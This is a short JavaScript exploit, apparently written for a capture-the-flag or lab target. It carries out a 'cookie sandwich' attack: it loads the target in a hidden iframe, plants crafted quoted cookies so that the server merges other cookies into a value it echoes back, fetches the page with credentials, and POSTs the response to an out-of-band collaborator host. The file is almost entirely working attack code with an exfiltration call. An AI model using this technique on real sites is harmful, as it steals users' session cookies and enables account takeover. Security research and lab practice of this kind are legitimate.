async function sandwich(target, cookie) {
    // Step 1: Create an iframe with target src and wait for it
    const iframe = document.createElement('iframe');

    const url = new URL(target);
    const domain = url.hostname;
    const path = url.pathname;

    iframe.src = target;
    // Hide the iframe
    iframe.style.display = 'none';
    document.body.appendChild(iframe);
    // Optional: Add your code to check and clean client's cookies if needed
    iframe.onload = async () => {
        // Step 2: Create cookie gadget
        document.cookie = `$Version=1; domain=${domain}; path=${path};`;
        document.cookie = `${cookie}="deadbeef; domain=${domain}; path=${path};`;
        document.cookie = `dummy=qaz"; domain=${domain}; path=/;`;
        // Step 3: Send a fetch request
        try {
            const response = await fetch(`${target}`, {
                credentials: 'include',
            });
            const responseData = await response.text()
            console.log(responseData)
            fetch("https://75aen95p0nr2zders25glv5mfdl49uxj.oastify.com",{
                 method: "POST",
                 body: responseData
            });
            // Step 4: Alert response
            alert(responseData);
        } catch (error) {
            console.error('Error fetching data:', error);
        }
    };
}

setTimeout(sandwich, 100, 'https://max-red-herring-v2.instances.kodack.dev/attacker-page', 'hello');

